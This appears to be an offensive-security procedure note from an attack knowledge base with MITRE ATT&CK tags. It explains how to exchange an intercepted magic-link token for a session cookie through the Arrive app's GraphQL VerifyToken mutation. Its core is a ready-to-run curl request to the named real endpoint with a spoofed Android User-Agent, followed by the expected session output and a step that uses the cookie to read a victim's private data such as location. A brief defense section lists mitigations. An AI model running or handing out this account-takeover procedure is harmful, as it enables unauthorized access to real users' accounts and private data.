---
id: proc-uuid-4
tags:
  - graphql
  - session-hijack
  - account-takeover
type: procedure
tools:
  - '[[tools/Android-SDK]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/verify-token-graphql]]'
verified: false
platforms:
  - Android
  - Mobile
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:33:12.311Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Verify-Token-to-Obtain-Session-Cookie

## Summary

This procedure verifies the intercepted magic link token via GraphQL mutation to obtain a valid session cookie, granting unauthorized access to the user's Arrive app account and private data.

## Description

The VerifyToken mutation at arrive-server.shopifycloud.com/graphql accepts the token without client or device validation, returning user details and a _arrive-server_session cookie. This bypasses the login flow, enabling account takeover. The endpoint lacks checks for token usage consistency, making it vulnerable post-interception.

## Requirements

1. Extracted token from deeplink
2. Network access to GraphQL endpoint
3. HTTP client (e.g., curl or Android HttpURLConnection)

## Defense

Defensive measures and detection strategies:

- Add device fingerprinting or IP binding to tokens
- Implement token one-time use with expiry
- Monitor for token verifications from unexpected User-Agents

## Objectives

1. Exchange token for session cookie
2. Authenticate as the target user
3. Access private account data

## Instructions

### Step 1: Send Verification Mutation

**Context**: POST the token to the GraphQL endpoint to retrieve the session.

**Command** ([[commands/verify-token-graphql]]):
```bash
curl -X POST https://arrive-server.shopifycloud.com/graphql \
  -H "Content-Type: application/json" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; Nexus 5X Build/OPM7.181105.004)" \
  -H "Cookie: _arrive-server_session=if_existing" \
  -d '{"operationName":"VerifyToken","variables":{"token":"FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa"},"query":"mutation VerifyToken($token: String!) { verifyToken(token: $token) { user { id __typename } userErrors { field message __typename } __typename } }"}'
```

> Expected output: {"data":{"verifyToken":{"user":{"id":"user_id","__typename":"User"},"userErrors":[],"__typename":"VerifyTokenPayload"}}} with Set-Cookie: _arrive-server_session=valid_session_value.

### Step 2: Use Session for Access

**Context**: Include the new cookie in subsequent requests to query user data.

Example: Query user location with the session cookie.

**Expected Output**: Access to private data confirmed.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/verify-token-graphql]]

## Tools Used

- [[tools/Android-SDK]]

## Tags

- graphql
- session
